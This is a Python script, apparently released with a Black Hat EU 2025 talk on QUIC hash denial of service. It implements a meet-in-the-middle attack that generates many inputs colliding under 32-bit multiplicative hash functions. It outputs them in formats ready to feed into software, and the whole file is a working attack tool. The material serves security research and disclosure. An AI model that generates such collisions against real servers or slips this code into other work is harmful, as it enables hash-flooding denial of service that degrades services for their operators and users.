# generic_mitm.py
# Generic meet-in-the-middle attack for 32-bit multiplicative hash functions
# Author: Paul Bottinelli
# For Black Hat EU 2025 - Cut to the QUIC: Slashing QUIC's Performance with a Hash DoS
#
# This implements a meet-in-the-middle attack against multiplicative hash functions,
# trading memory for time to efficiently generate hash collisions.

import argparse
import binascii
import os
import random
import sys

U32_MASK = 0xFFFFFFFF
U32_SIZE = 32

class MultiplicativeHash:
    """
    Multiplicative hash with given initial value and multiplier.
    Implements a meet-in-the-middle attack for generating hash collisions.
    Only computes on 32-bit hashes for now.
    """
    def __init__(self, initial_value, multiplier):
        self.INITIAL_VALUE = initial_value
        self.MULTIPLIER = multiplier
        self.hash_size = (1 << U32_SIZE)
        self.INV_MULTIPLIER = pow(self.MULTIPLIER, -1, self.hash_size)

    def hash(self, val):
        digest = self.INITIAL_VALUE
        for i in range(len(val)):
            digest = ((digest * self.MULTIPLIER) + val[i]) & U32_MASK
        return digest

    def __partial_forward_hash(self, val):
        return self.hash(val)

    def __partial_backward_hash(self, val, target):
        hash_target = target
        for char in val[::-1]:
            hash_target = ((hash_target - char) * self.INV_MULTIPLIER) & U32_MASK
        return hash_target

    def __rand_generator(self, size):
        return bytearray(os.urandom(size))

    def __suffix_generator(self, int_val, length):
        return int_val.to_bytes(length, byteorder='big')

    def __show_progress(self, current, total, bar_length=40):
        progress = current / total
        bar = '#' * int(progress * bar_length) + '-' * (bar_length - int(progress * bar_length))
        percent = progress * 100
        sys.stdout.write(f'\rProgress: [{bar}] {percent:.2f}%')
        sys.stdout.flush()

    def meet_in_middle(self, prefix_size, suffix_size, n_collisions=10, target_hash=None, output=None, print_fct=print, interactive=False):
        """
        Perform meet-in-the-middle attack to generate hash collisions.

        Args:
            prefix_size: Size of the random prefix
            suffix_size: Size of the precomputed suffix (affects memory usage)
            n_collisions: Number of collisions to generate
            target_hash: Target hash value (random if None)
            output: Output file path (prints to console if None)
            print_fct: Function to format collision output
            interactive: Enable progress bar display
        """
        if prefix_size <= 0 or suffix_size <= 0:
            raise ValueError("Prefix and suffix sizes must be positive integers")
        if n_collisions <= 0:
            raise ValueError("Number of collisions must be positive")
        if suffix_size > 3:
            print(f"Warning: suffix_size={suffix_size} will create a table of 2^{suffix_size*8} entries, which may consume significant memory")

        precomp = {}

        if target_hash is None:
            target_hash = random.randint(0, 2**U32_SIZE - 1)

        # We upperbound the memory usage to 2^24
        upper_bound = min(24, suffix_size*8)

        print("Target hash: ", target_hash)
        print("Entries in table: 2^", upper_bound, " = ", 2**upper_bound)
        print("Starting precomputations.")

        total = 2**upper_bound
        increment_display = total // 1000
        for i in range(total):
            # Displaying progress
            if interactive and (i % increment_display == 0 or i == total - 1):
                self.__show_progress(i, total)

            s = self.__suffix_generator(i, suffix_size)
            h = self.__partial_backward_hash(s, target_hash)
            precomp[h] = s

        print("\nDone precomputing.")

        n = 0
        collisions = []
        output_file = None

        # Open output file if specified
        if output:
            try:
                output_file = open(output, 'w')
            except IOError as e:
                print(f"Error: Could not open output file '{output}': {e}")
                return []

        while n != n_collisions:
            s = self.__rand_generator(prefix_size)
            h = self.__partial_forward_hash(s)
            if h in precomp:
                collision = s + precomp[h]
                collisions.append(collision)

                # Write to file or print to console
                if output_file:
                    if print_fct == print_hex_string:
                        output_file.write(binascii.hexlify(collision).decode() + '\n')
                    elif print_fct == print_c_array:
                        output_file.write("{" + ", ".join('0x%02x' % i for i in collision) + "}\n")
                    else:
                        output_file.write(str(collision) + '\n')
                else:
                    print_fct(collision)

                n += 1

        if output_file:
            output_file.close()
            print(f"Collisions written to {output}")

        return collisions

def print_c_array(hex_string):
    """Print collision as C-style byte array."""
    print("{" + ", ".join('0x%02x' % i for i in hex_string) + "}")

def print_hex_string(hex_string):
    """Print collision as hexadecimal string."""
    print(binascii.hexlify(hex_string).decode())

def run_attack(prefix_size, suffix_size, initial_value, multiplier, n_collisions, print_fct, interactive, output):
    """Execute the meet-in-the-middle collision attack."""
    mHash = MultiplicativeHash(initial_value, multiplier)
    collisions = mHash.meet_in_middle(
        prefix_size, suffix_size,
        n_collisions=n_collisions,
        print_fct=print_fct,
        interactive=interactive,
        output=output
    )
    return collisions

def main(args):
    """Main entry point for the script."""
    # Validate n_collisions upper bound (2^32)
    MAX_COLLISIONS = 2**32
    if args.n_collisions > MAX_COLLISIONS:
        print(f"Error: Number of collisions cannot exceed 2^32 ({MAX_COLLISIONS})")
        sys.exit(1)

    print_fct = print
    if args.format == 'c':
        print_fct = print_c_array
    elif args.format == 'hex':
        print_fct = print_hex_string

    try:
        run_attack(
            args.prefix, args.suffix,
            args.initial, args.multiplier,
            args.n_collisions,
            print_fct, args.interactive, args.output
        )
    except ValueError as e:
        print(f"Error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
        sys.exit(0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Generate colliding inputs for multiplicative hash functions using meet-in-the-middle attack."
    )
    parser.add_argument(
        '-f', '--format',
        type=str,
        choices=['c', 'hex', 'bytes'],
        default='bytes',
        help="Output format: 'c' for C-style byte array, 'hex' for hexadecimal, 'bytes' for byte representation (default: 'bytes')."
    )
    parser.add_argument(
        '-o', '--output',
        type=str,
        help='Output file to write the result to. If not provided, prints to console.'
    )
    parser.add_argument(
        '-p', '--prefix',
        type=int,
        default=7,
        help='Prefix size (default: 7).'
    )
    parser.add_argument(
        '-s', '--suffix',
        type=int,
        default=3,
        help='Suffix size. Dictates the size of the precomputation table (default: 3).'
    )
    parser.add_argument(
        '-i', '--initial',
        type=int,
        default=5387,
        help='Initial value for the multiplicative hash computation (default: 5387).'
    )
    parser.add_argument(
        '-m', '--multiplier',
        type=int,
        default=31,
        help='Multiplier for the multiplicative hash computation (default: 31).'
    )
    parser.add_argument(
        '-n', '--n-collisions',
        type=int,
        default=100,
        help='The number of collisions to compute (default: 100, max: 2^32).'
    )
    parser.add_argument(
        '--interactive',
        action='store_true',
        help='Enable interactive mode with progress bar.'
    )

    args = parser.parse_args()
    main(args)